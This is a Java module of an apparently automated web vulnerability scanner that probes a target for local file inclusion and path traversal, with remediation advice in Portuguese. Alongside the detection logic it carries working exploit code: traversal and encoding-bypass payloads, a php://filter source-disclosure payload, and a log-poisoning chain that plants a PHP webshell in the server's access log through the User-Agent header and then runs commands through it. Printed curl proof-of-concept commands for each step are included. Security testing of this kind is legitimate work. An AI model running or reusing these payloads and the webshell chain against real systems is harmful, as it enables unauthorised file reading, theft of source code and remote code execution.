package gg.effront.anarcry.scanner.web.lfi;

import gg.effront.anarcry.model.CvssCalculator;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.Scanner;
import gg.effront.anarcry.scanner.util.Http;
import gg.effront.anarcry.scanner.util.HttpClientFactory;

import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * LfiModule — detects Local File Inclusion / Path Traversal (CWE-22).
 *
 * <p>
 * Phases:
 * <ol>
 * <li>Linux traversal — inject canonical payloads, look for "root:x:" in
 * response</li>
 * <li>Windows traversal — inject win.ini traversal, look for
 * "[extensions]"</li>
 * <li>PHP wrapper — if PHP fingerprinted, inject php://filter and check
 * base64-decoded content</li>
 * <li>Log poisoning → RCE chain — if Linux LFI confirmed on Apache/Nginx
 * server</li>
 * </ol>
 *
 * <p>
 * Anti-FP: baseline fetched per (path, param) pair before injection; canonical
 * content pattern must NOT match the baseline to suppress false positives from
 * pages that already embed those strings.
 */
public class LfiModule implements Scanner {

    // -------------------------------------------------------------------------
    // Probe configuration
    // -------------------------------------------------------------------------

    private static final List<String> PROBE_PATHS = List.of("/", "/api/", "/api/v1/", "/docs", "/page", "/file",
            "/load", "/template", "/render");

    /** Parameter names whose keyword appears in file-referencing contexts. */
    private static final List<String> FILE_PARAM_KEYWORDS = List.of("file", "page", "include", "path", "template",
            "load", "read", "dir", "folder", "view", "doc", "document", "resource");

    // -------------------------------------------------------------------------
    // Payload records
    // -------------------------------------------------------------------------

    /**
     * Wraps a traversal payload.
     *
     * @param value
     *            the payload string
     * @param encode
     *            true → URLEncoder.encode() before inserting into query string
     *            false → append as-is (already contains valid percent-sequences)
     */
    private record Payload(String value, boolean encode) {
        String asQueryValue() {
            if (!encode)
                return value;
            try {
                return URLEncoder.encode(value, "UTF-8");
            } catch (Exception e) {
                return value;
            }
        }
    }

    /**
     * Linux payloads — mix of plain traversal sequences (encode=true) and
     * pre-encoded bypass variants (encode=false, already URL-safe).
     */
    private static final List<Payload> PAYLOADS_LINUX = List.of(new Payload("../../etc/passwd", true),
            new Payload("../../../etc/passwd", true), new Payload("../../../../etc/passwd", true),
            // Pre-encoded bypass — dots encoded; do NOT re-encode (would double-encode %)
            new Payload("..%2F..%2Fetc%2Fpasswd", false), new Payload("%2e%2e%2f%2e%2e%2fetc%2fpasswd", false),
            // Double-dot bypass (....// technique)
            new Payload("....//....//etc/passwd", false));

    /**
     * Windows payloads — backslash replaced with %5C so URI.create() accepts the
     * URL.
     */
    private static final List<Payload> PAYLOADS_WINDOWS = List.of(new Payload("../../windows/win.ini", true),
            // Backslash variant — encode=false because we pre-encoded the backslash below
            new Payload("..%5C..%5Cwindows%5Cwin.ini", false));

    /** PHP stream wrapper for source disclosure. */
    private static final String PHP_WRAPPER_PAYLOAD = "php://filter/convert.base64-encode/resource=index.php";

    // -------------------------------------------------------------------------
    // Detection patterns
    // -------------------------------------------------------------------------

    private static final Pattern LINUX_PATTERN = Pattern.compile("root:x:");
    private static final Pattern WINDOWS_PATTERN = Pattern.compile("\\[extensions\\]");
    /**
     * Matches a base64-encoded blob of at least 100 chars — proxy for PHP source.
     */
    private static final Pattern PHP_B64_PATTERN = Pattern.compile("[A-Za-z0-9+/=]{100,}");
    /**
     * Output from id(1) or /etc/passwd inclusion — confirms RCE via log poisoning.
     */
    private static final Pattern RCE_OUTPUT = Pattern.compile("uid=\\d+|root:x:|www-data");

    private static final Pattern SERVER_APACHE = Pattern.compile("(?i)apache");
    private static final Pattern SERVER_NGINX = Pattern.compile("(?i)nginx");

    // -------------------------------------------------------------------------
    // Scanner contract
    // -------------------------------------------------------------------------

    @Override
    public String id() {
        return "LFI";
    }

    @Override
    public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
        String cweId = CweRegistry.cweId(id());
        String cweTitle = CweRegistry.cweTitle(id());
        String cvssVec = CweRegistry.cvssVector(id());
        double score = CvssCalculator.calculate(cvssVec);

        List<Finding> findings = new ArrayList<>();

        // Use http2 shared client for GET probing (redirects allowed)
        HttpClient hc = HttpClientFactory.http2();

        String scheme = ctx.isHttps() ? "https" : "http";
        int defPort = ctx.isHttps() ? 443 : 80;
        String base = scheme + "://" + ctx.host() + (ctx.port() != defPort ? ":" + ctx.port() : "");

        log.accept("[~] LFI: iniciando scan de path traversal em " + base);

        // State tracked across phases
        boolean phpDetected = false;
        boolean linuxConfirmed = false;
        String confirmedPath = null;
        String confirmedParam = null;
        String confirmedPayload = null;
        String serverHeader = null;

        // -----------------------------------------------------------------------
        // Phase 1: Linux traversal
        // -----------------------------------------------------------------------
        log.accept("[~] LFI: fase 1 — payloads Linux (etc/passwd)");

        linuxOuter : for (String path : PROBE_PATHS) {
            // Probe the path without params to fingerprint PHP and Server header
            try {
                HttpRequest probeReq = HttpRequest.newBuilder().uri(URI.create(base + path))
                        .timeout(Duration.ofSeconds(5)).GET().build();
                HttpResponse<String> probeResp = Http.send(ctx, hc, probeReq, HttpResponse.BodyHandlers.ofString(),
                        id());
                String probeBody = probeResp.body() != null ? probeResp.body() : "";

                // PHP fingerprint
                String xPowered = probeResp.headers().firstValue("X-Powered-By").orElse("");
                if (!phpDetected && (xPowered.toLowerCase().contains("php") || probeBody.contains("PHP Warning")
                        || probeBody.contains("PHP Parse error") || probeBody.contains("<?php"))) {
                    phpDetected = true;
                    log.accept("[~] LFI: PHP fingerprinted em " + path);
                }
                // Server header (first non-empty wins)
                if (serverHeader == null || serverHeader.isBlank()) {
                    serverHeader = probeResp.headers().firstValue("Server").orElse("");
                }
            } catch (Exception ignored) {
            }

            for (String param : FILE_PARAM_KEYWORDS) {
                // Anti-FP baseline — fetch with a benign, non-existent file name
                String baseline = fetchBody(ctx, hc, base + path + "?" + param + "=index");

                // Skip if baseline already contains the oracle string (pre-existing content)
                if (LINUX_PATTERN.matcher(baseline).find()) {
                    continue;
                }

                for (Payload payload : PAYLOADS_LINUX) {
                    String qv = payload.asQueryValue();
                    String testUrl = base + path + "?" + param + "=" + qv;
                    try {
                        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(testUrl))
                                .timeout(Duration.ofSeconds(6)).GET().build();
                        HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
                        String body = resp.body() != null ? resp.body() : "";

                        if (LINUX_PATTERN.matcher(body).find()) {
                            log.accept("[!!!] LFI Linux: /etc/passwd lido via " + path + "?" + param + "="
                                    + payload.value());
                            linuxConfirmed = true;
                            confirmedPath = path;
                            confirmedParam = param;
                            confirmedPayload = payload.value();

                            String poc = "curl '" + base + path + "?" + param + "="
                                    + URLEncoder.encode(payload.value(), "UTF-8") + "'";

                            findings.add(Finding.of(id(), path + "?" + param + "=" + payload.value(),
                                    "LFI — Leitura de /etc/passwd confirmada", Severity.CRITICAL,
                                    "Payload: " + payload.value() + " | Resposta contém 'root:x:' | URL: " + testUrl,
                                    "Path traversal confirma leitura arbitrária de arquivos do sistema. "
                                            + "Exposição de /etc/passwd revela contas locais e pode encadear "
                                            + "ataques de log poisoning ou brute-force de credenciais.",
                                    poc,
                                    "Validar e sanitizar caminhos; usar allowlist de arquivos permitidos; "
                                            + "nunca interpolar entrada do usuário em operações de leitura de arquivo; "
                                            + "aplicar chroot ou contenção de processo.",
                                    cweId, cweTitle, cvssVec, score));
                            break linuxOuter;
                        }
                    } catch (Exception ignored) {
                    }
                }
            }
        }

        // -----------------------------------------------------------------------
        // Phase 2: Windows traversal (only if Linux not confirmed)
        // -----------------------------------------------------------------------
        if (!linuxConfirmed) {
            log.accept("[~] LFI: fase 2 — payloads Windows (win.ini)");

            windowsOuter : for (String path : PROBE_PATHS) {
                for (String param : FILE_PARAM_KEYWORDS) {
                    String baseline = fetchBody(ctx, hc, base + path + "?" + param + "=index");
                    if (WINDOWS_PATTERN.matcher(baseline).find()) {
                        continue;
                    }

                    for (Payload payload : PAYLOADS_WINDOWS) {
                        String qv = payload.asQueryValue();
                        String testUrl = base + path + "?" + param + "=" + qv;
                        try {
                            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(testUrl))
                                    .timeout(Duration.ofSeconds(6)).GET().build();
                            HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(),
                                    id());
                            String body = resp.body() != null ? resp.body() : "";

                            if (WINDOWS_PATTERN.matcher(body).find()) {
                                log.accept("[!!!] LFI Windows: win.ini lido via " + path + "?" + param + "="
                                        + payload.value());

                                String poc = "curl '" + base + path + "?" + param + "="
                                        + URLEncoder.encode(payload.value(), "UTF-8") + "'";

                                findings.add(Finding.of(id(), path + "?" + param + "=" + payload.value(),
                                        "LFI — Leitura de windows/win.ini confirmada", Severity.HIGH,
                                        "Payload: " + payload.value() + " | Resposta contém '[extensions]' | URL: "
                                                + testUrl,
                                        "Path traversal confirma leitura de arquivos do sistema Windows.", poc,
                                        "Validar e sanitizar caminhos; usar allowlist de arquivos permitidos.", cweId,
                                        cweTitle, cvssVec, score));
                                break windowsOuter;
                            }
                        } catch (Exception ignored) {
                        }
                    }
                }
            }
        }

        // -----------------------------------------------------------------------
        // Phase 3: PHP stream wrapper — only if PHP was detected
        // -----------------------------------------------------------------------
        if (phpDetected) {
            log.accept("[~] LFI: fase 3 — PHP wrapper php://filter");

            phpOuter : for (String path : PROBE_PATHS) {
                for (String param : FILE_PARAM_KEYWORDS) {
                    String encoded = URLEncoder.encode(PHP_WRAPPER_PAYLOAD, "UTF-8");
                    String testUrl = base + path + "?" + param + "=" + encoded;
                    try {
                        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(testUrl))
                                .timeout(Duration.ofSeconds(6)).GET().build();
                        HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
                        String body = resp.body() != null ? resp.body() : "";

                        Matcher b64m = PHP_B64_PATTERN.matcher(body);
                        if (b64m.find()) {
                            // Validate: decoded content must resemble PHP source
                            boolean confirmedPhp = false;
                            try {
                                byte[] decoded = Base64.getDecoder().decode(b64m.group());
                                String text = new String(decoded);
                                confirmedPhp = text.contains("<?php") || text.contains("<?") || text.contains("require")
                                        || text.contains("$_");
                            } catch (Exception ignored) {
                            }

                            if (confirmedPhp) {
                                log.accept(
                                        "[!!!] LFI PHP wrapper: código-fonte PHP extraído via " + path + "?" + param);

                                findings.add(Finding.of(id(), path + "?" + param + "=" + PHP_WRAPPER_PAYLOAD,
                                        "LFI — php://filter wrapper confirma leitura de código-fonte PHP",
                                        Severity.HIGH,
                                        "php://filter/convert.base64-encode/resource=index.php retornou base64 "
                                                + "decodificável para código PHP | URL: " + testUrl,
                                        "Wrapper php://filter permite exfiltração do código-fonte PHP, expondo "
                                                + "lógica de negócio, credenciais em config files, tokens e chaves.",
                                        "curl '" + testUrl + "' | grep -oP '[A-Za-z0-9+/=]{100,}' | base64 -d",
                                        "Desabilitar allow_url_include e allow_url_fopen no php.ini; "
                                                + "nunca interpolar parâmetros do usuário em include()/require(); "
                                                + "usar realpath() + verificação de prefixo de diretório permitido.",
                                        cweId, cweTitle, cvssVec, score));
                                break phpOuter;
                            }
                        }
                    } catch (Exception ignored) {
                    }
                }
            }
        }

        // -----------------------------------------------------------------------
        // Phase 4: Log poisoning → RCE chain (requires Linux LFI + Apache/Nginx)
        // -----------------------------------------------------------------------
        if (linuxConfirmed && serverHeader != null
                && (SERVER_APACHE.matcher(serverHeader).find() || SERVER_NGINX.matcher(serverHeader).find())) {
            log.accept("[~] LFI: fase 4 — tentando log poisoning chain (" + serverHeader + ")");
            String rceEvidence = tryLogPoisoningChain(ctx, hc, base, confirmedPath, confirmedParam, serverHeader, log);

            if (rceEvidence != null) {
                // RCE chain uses a stricter CVSS — full C/I/A + network scope changed
                String rceVec = "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H";
                double rceScore = CvssCalculator.calculate(rceVec);

                findings.add(Finding.of(id(), confirmedPath + "?" + confirmedParam + "=" + confirmedPayload,
                        "LFI → RCE via Log Poisoning CONFIRMADO", Severity.CRITICAL,
                        "Log poisoning via User-Agent contendo webshell PHP + inclusão do log via LFI "
                                + "confirmou execução de código | " + rceEvidence,
                        "Execução remota de código (RCE) confirmada. Atacante pode executar comandos "
                                + "arbitrários no servidor via inclusão do access log envenenado.",
                        "# 1. Envenenar log com webshell no User-Agent:\n"
                                + "curl -A '<?php system($_GET[\"cmd\"]); ?>' '" + base + "/'\n\n"
                                + "# 2. Incluir log via LFI com execução de comando:\n" + "curl '" + base
                                + confirmedPath + "?" + confirmedParam + "=/var/log/apache2/access.log&cmd=id'",
                        "Desabilitar include dinâmico; aplicar chroot/contenção; remover permissões "
                                + "de leitura de diretórios de log para o processo do servidor web; "
                                + "usar WAF com regra anti-traversal.",
                        cweId, cweTitle, rceVec, rceScore));
            }
        }

        if (findings.isEmpty()) {
            log.accept("[+] LFI: nenhum path traversal detectado");
        }
        return findings;
    }

    // -------------------------------------------------------------------------
    // Log poisoning chain
    // -------------------------------------------------------------------------

    /**
     * Attempts a PHP log poisoning → RCE chain:
     * <ol>
     * <li>Sends a request with User-Agent set to a PHP webshell snippet to poison
     * the access log.</li>
     * <li>Sends a second harmless request to flush the log write.</li>
     * <li>Waits 1 s so the kernel/buffer flushes the log to disk.</li>
     * <li>Includes each candidate log path via the confirmed LFI parameter with
     * {@code &cmd=id}, then checks for RCE output.</li>
     * </ol>
     *
     * <p>
     * The same {@link HttpClient} instance is used for all requests so that the
     * poisoning request is visible to the server before the inclusion request.
     *
     * @return a non-null evidence string if RCE was confirmed, or null otherwise
     */
    private String tryLogPoisoningChain(ScanContext ctx, HttpClient hc, String base, String confirmedPath,
            String confirmedParam, String serverHeader, Consumer<String> log) {

        List<String> logPaths = SERVER_APACHE.matcher(serverHeader).find()
                ? List.of("/var/log/apache2/access.log", "/var/log/httpd/access_log", "/proc/self/fd/2")
                : List.of("/var/log/nginx/access.log", "/var/log/nginx/error.log", "/proc/self/fd/2");

        // Step 1: Poison the access log with a PHP webshell in User-Agent
        String poisonAgent = "<?php system($_GET[\"cmd\"]); ?>";
        try {
            HttpRequest poisonReq = HttpRequest.newBuilder().uri(URI.create(base + "/")).timeout(Duration.ofSeconds(5))
                    .header("User-Agent", poisonAgent).GET().build();
            Http.send(ctx, hc, poisonReq, HttpResponse.BodyHandlers.ofString(), id());

            // Second harmless request to ensure the access log entry is written
            Http.send(ctx, hc,
                    HttpRequest.newBuilder().uri(URI.create(base + "/")).timeout(Duration.ofSeconds(5)).GET().build(),
                    HttpResponse.BodyHandlers.ofString(), id());
        } catch (Exception ignored) {
        }

        // Wait for the log write to be flushed to disk before inclusion
        try {
            Thread.sleep(1000);
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
        }

        // Step 2: Include each candidate log path via the confirmed LFI param
        for (String logPath : logPaths) {
            try {
                String encoded = URLEncoder.encode(logPath, "UTF-8");
                String testUrl = base + confirmedPath + "?" + confirmedParam + "=" + encoded + "&cmd=id";
                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(testUrl)).timeout(Duration.ofSeconds(6)).GET()
                        .build();
                HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
                String body = resp.body() != null ? resp.body() : "";

                Matcher m = RCE_OUTPUT.matcher(body);
                if (m.find()) {
                    log.accept("[!!!] LFI RCE via log poisoning em " + logPath + " → output: '" + m.group() + "'");
                    return logPath + " → output: " + m.group();
                }
            } catch (Exception ignored) {
            }
        }
        return null;
    }

    // -------------------------------------------------------------------------
    // Helpers
    // -------------------------------------------------------------------------

    /** Fetches URL body, returning empty string on any error. */
    private String fetchBody(ScanContext ctx, HttpClient hc, String url) {
        try {
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(5)).GET()
                    .build();
            HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            return resp.body() != null ? resp.body() : "";
        } catch (Exception e) {
            return "";
        }
    }
}
